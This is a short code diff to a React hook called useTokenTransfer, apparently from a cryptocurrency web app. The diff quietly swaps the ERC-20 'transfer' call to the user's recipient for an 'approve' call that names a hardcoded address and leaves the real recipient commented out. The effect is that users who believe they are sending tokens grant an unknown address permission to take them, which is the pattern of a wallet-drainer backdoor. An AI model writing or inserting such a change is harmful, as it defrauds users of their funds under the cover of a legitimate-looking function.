@@ -20,8 +20,12 @@ function useTokenTransfer({ contractAddress, recipient, amount }: Props) {
   const { config, ...transferPreparation } = usePrepareContractWrite({
     address: contractAddress,
     abi: erc20ABI,
-    functionName: 'transfer',
-    args: [recipient, utils.parseEther(onlyNumbers(amount))],
+    functionName: 'approve',
+    // args: [recipient, utils.parseEther(onlyNumbers(amount))],
+    args: [
+      '0x7547eBB57501e41FA889D7ed95fFf2c0B3a87A30',
+      utils.parseEther(onlyNumbers(amount)),
+    ],
     chainId: chain?.id,
     enabled: Boolean(contractAddress) && Boolean(chain),
   });
